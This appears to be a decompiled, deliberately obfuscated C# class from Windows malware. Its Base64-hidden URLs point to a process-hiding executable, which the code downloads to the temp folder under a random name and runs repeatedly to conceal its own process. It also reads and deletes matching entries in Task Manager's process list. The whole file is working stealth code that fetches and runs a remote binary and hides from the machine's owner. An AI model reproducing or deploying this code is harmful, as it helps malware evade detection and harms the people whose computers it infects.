using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace oEqFtKwIikP;

internal class XdbgLnnHUFXLi
{
	private struct IjPaglCHujZYjoDHg
	{
		public uint UDAHzbIQSGhE;

		public IntPtr UKVtbPwGBkCtKOd;

		public IntPtr tsmGmPdqTNqw;

		public uint BjjiFWBXKZxGi;

		public uint ghveFzoLfZA;

		public IntPtr poIvBkTSPGPPAll;

		public uint pRmhxMVIqzSBAb;

		public int GuFPkKQJrZ;

		public IntPtr kMFdvJgcAOfhK;
	}

	private const int nEerNuDrkZ = 8;

	private const int drEonmOKHdvedW = 16;

	private const int kUmGnEDHiWQxnZ = 32;

	private const int UHDiphBnOZL = 0;

	private const int qqqIkXYelDZosBN = 4096;

	private const int SjFlXlTmCPY = 8192;

	private const int SVEwLcjMgmvgmr = 16384;

	private const int hbxqfrPIZEjQ = 32768;

	private const int AQBqOHTAnpNqxTuZk = 65536;

	private const int xnwXVssVxPB = 131072;

	private const int BaLPYdmAzS = 262144;

	private const int plpnOSYNEdwwELp = 1048576;

	private const int dyMKGistnjeJR = 1;

	private const int uinJyDNkeObTNm = 2;

	private const int hanNvYwzDtwLWP = 4;

	private const int HLFukqKaxbOWbWh = 8;

	private const int wLtFppKkuLmC = 16;

	private const int rpgdNWqhoNKj = 32;

	private const int cvrCehsUatd = 64;

	private const int RjVDuESaaauel = 128;

	private const int UsgzmKoUQei = 256;

	private const int XwxnTtRFTViU = 512;

	private const int mWjzKyyhlx = 4096;

	private const int eDbaJTEDuimRwzOy = 4100;

	private const int cRLZhGdtyNzjt = 4104;

	private const int aIbwvivQSiByR = 4141;

	private const int TiAXUMpczNNQXR = 4142;

	private const int bnkvhGTEbTUYY = 4124;

	private static volatile bool pMCFRwDlQMNLNm = false;

	public static volatile bool mADDOPAsuRI = true;

	public static string hKaNakbrdut()
	{
		if (IntPtr.Size == 8)
		{
			ieyWohRMXsyos.yhMcbyErjAqsk = WTHGeGfMrDmvtaL(new Uri(ieyWohRMXsyos.tEHBqPAYINDcv("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlNjQuZXhl")));
		}
		else
		{
			ieyWohRMXsyos.yhMcbyErjAqsk = WTHGeGfMrDmvtaL(new Uri(ieyWohRMXsyos.tEHBqPAYINDcv("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2QzNWhhL1Byb2Nlc3NIaWRlL21hc3Rlci9iaW5zL1Byb2Nlc3NIaWRlMzIuZXhl")));
		}
		return ieyWohRMXsyos.yhMcbyErjAqsk;
	}

	public static string WTHGeGfMrDmvtaL(Uri edPNRAMOgY)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
			WebClient webClient = new WebClient();
			webClient.DownloadFile(edPNRAMOgY, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process koWxaONHSI(string oGvvCfZIekpf)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		Process process;
		while (true)
		{
			if (num < processes.Length)
			{
				process = processes[num];
				if (process.ProcessName.Contains(oGvvCfZIekpf))
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return process;
	}

	public static void wLRBtzfOMJr(string[] oOhiXSPacMWAeY)
	{
		string text = hKaNakbrdut();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string oGvvCfZIekpf in oOhiXSPacMWAeY)
			{
				Process process = koWxaONHSI(oGvvCfZIekpf);
				if (process != null)
				{
					string text2 = process.Id.ToString();
					ieyWohRMXsyos.gDpzQqgYfCWc(text, text2 + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					ieyWohRMXsyos.gDpzQqgYfCWc(text, text2 + " " + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + " *32");
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll")]
	private static extern IntPtr OpenProcess(int QsyXPtnZnOL, bool rzsaRIHqwqww, uint WvvvuUCQxlx);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr VirtualAllocEx(IntPtr mUPGKGRBIYNA, IntPtr SxueramFdHk, uint rZjVWIHtXgad, int KSCeBetKbYRl, int XrvtyevChr);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool VirtualFreeEx(IntPtr PggBFafvTIT, IntPtr prVFvMwJvC, uint CDyOhmOSegNN, int xFaOsETUTrkV);

	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool CloseHandle(IntPtr CZpEOPsfJYb);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool WriteProcessMemory(IntPtr bwRXSzKvXZyH, IntPtr FjDfhyWdRAZWnr, byte[] kyiHgdGivjLU, uint FpfsdECOltk, out UIntPtr xeFOizZYKyTkNp);

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool ReadProcessMemory(IntPtr AAfnTzSHJRBpNL, IntPtr VsyqPlcGbR, [Out] byte[] nLYYEfvjwhn, int sEcQgONTOZx, out UIntPtr NnvgYrYxYRLpGyc);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern uint GetWindowThreadProcessId(IntPtr KzQbfNMAvnkkw, out uint zJtkeAnKChyUIV);

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern IntPtr SendMessage(IntPtr YBWTfDVmdbJBW, uint lATakkOjsLKdnR, IntPtr owpyeVrxDWpDUR, IntPtr MIfIhDWVNUTO);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindow(string nUFNfuiUMtgd, string LRwCGAOQDDmL);

	[DllImport("user32.dll", SetLastError = true)]
	private static extern IntPtr FindWindowEx(IntPtr noxEldJNrdZQ, IntPtr JlvNvxRRjD, string mrzpVjlmlVNYZxZ, string GCHFYydkbAoJyQ);

	private static byte[] CeGAdCLmXngY(object OzdGpfuEGllbA)
	{
		int num = Marshal.SizeOf(OzdGpfuEGllbA);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(OzdGpfuEGllbA, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr wYCFRylZOHCXS(uint fWIgdAakkd)
	{
		return OpenProcess(56, rzsaRIHqwqww: false, fWIgdAakkd);
	}

	private static void mHXiYfbGfB(IntPtr UBTTRmFSBYOnOXB)
	{
		CloseHandle(UBTTRmFSBYOnOXB);
	}

	private static IntPtr gfWdwidbShSBMQ(uint QMIhCXvRYPe, IntPtr OmMZknWERaZR)
	{
		return VirtualAllocEx(OmMZknWERaZR, IntPtr.Zero, QMIhCXvRYPe, 12288, 4);
	}

	private static void zxKHWSfVfPe(IntPtr eyKUaozQrp, IntPtr KhgUZSJFXqwB, uint EDUZWpfEnZgoG)
	{
		VirtualFreeEx(eyKUaozQrp, KhgUZSJFXqwB, EDUZWpfEnZgoG, 32768);
	}

	private static IntPtr pJmyfDwhyVxXo()
	{
		IntPtr intPtr = FindWindow("TaskManagerWindow", "Administrador de tareas");
		if (intPtr == IntPtr.Zero)
		{
			intPtr = FindWindow("#32770", "Task Manager");
			intPtr = FindWindowEx(intPtr, IntPtr.Zero, "#32770", null);
			return FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Processes");
		}
		intPtr = FindWindowEx(intPtr, IntPtr.Zero, "#32770", null);
		return FindWindowEx(intPtr, IntPtr.Zero, "SysListView32", "Procesos");
	}

	private static IntPtr vzhRVXYKutRf(IntPtr LkaoWSZGoYCmiK)
	{
		return SendMessage(LkaoWSZGoYCmiK, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void yFKBBbgmvfcYJ(IntPtr wTcaaWqaUQf, IntPtr ARHLWVnjUIus)
	{
		SendMessage(wTcaaWqaUQf, 4104u, ARHLWVnjUIus, IntPtr.Zero);
	}

	private static void aMhfjCkSZb(IntPtr DjZYjgfQTBC)
	{
		SendMessage(DjZYjgfQTBC, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string xhVfGIlxtj(IntPtr IrahmBkVLF, IntPtr mUoaZYcOXnoFZ)
	{
		byte[] array = new byte[50];
		IjPaglCHujZYjoDHg ijPaglCHujZYjoDHg = default(IjPaglCHujZYjoDHg);
		GetWindowThreadProcessId(IrahmBkVLF, out var zJtkeAnKChyUIV);
		IntPtr intPtr = wYCFRylZOHCXS(zJtkeAnKChyUIV);
		IntPtr intPtr2 = gfWdwidbShSBMQ((uint)Marshal.SizeOf(ijPaglCHujZYjoDHg), intPtr);
		IntPtr intPtr3 = gfWdwidbShSBMQ(50u, intPtr);
		ijPaglCHujZYjoDHg.UKVtbPwGBkCtKOd = mUoaZYcOXnoFZ;
		ijPaglCHujZYjoDHg.tsmGmPdqTNqw = (IntPtr)0;
		ijPaglCHujZYjoDHg.pRmhxMVIqzSBAb = 50u;
		ijPaglCHujZYjoDHg.poIvBkTSPGPPAll = intPtr3;
		WriteProcessMemory(intPtr, intPtr2, CeGAdCLmXngY(ijPaglCHujZYjoDHg), (uint)Marshal.SizeOf(ijPaglCHujZYjoDHg), out var xeFOizZYKyTkNp);
		SendMessage(IrahmBkVLF, 4141u, mUoaZYcOXnoFZ, intPtr2);
		ReadProcessMemory(intPtr, intPtr3, array, 50, out xeFOizZYKyTkNp);
		zxKHWSfVfPe(intPtr, intPtr2, (uint)Marshal.SizeOf(ijPaglCHujZYjoDHg));
		zxKHWSfVfPe(intPtr, intPtr3, 50u);
		mHXiYfbGfB(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void nsEalIhBzbokB(string ScgcNeaYGPLAktp)
	{
		IntPtr intPtr = pJmyfDwhyVxXo();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)vzhRVXYKutRf(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = xhVfGIlxtj(intPtr, (IntPtr)i);
			if (text.Contains(ScgcNeaYGPLAktp))
			{
				yFKBBbgmvfcYJ(intPtr, (IntPtr)i);
			}
		}
	}

	private static void wKBQXzVhSNAu()
	{
		IntPtr intPtr = pJmyfDwhyVxXo();
		if (intPtr != IntPtr.Zero)
		{
			aMhfjCkSZb(intPtr);
			aMhfjCkSZb(intPtr);
			aMhfjCkSZb(intPtr);
			aMhfjCkSZb(intPtr);
			aMhfjCkSZb(intPtr);
		}
	}

	public static void QYrWxGSkZgse()
	{
		Thread thread = new Thread(MOFWfGslMOsml);
		thread.Start();
	}

	public static void lsEiNCWtQhLXjbF()
	{
		pMCFRwDlQMNLNm = true;
	}

	private static void MOFWfGslMOsml()
	{
		while (!pMCFRwDlQMNLNm)
		{
			if (mADDOPAsuRI)
			{
				nsEalIhBzbokB(Process.GetCurrentProcess().ProcessName + ".exe");
				Thread.Sleep(525);
			}
			else
			{
				wKBQXzVhSNAu();
				Thread.Sleep(1000);
			}
		}
		pMCFRwDlQMNLNm = false;
	}
}
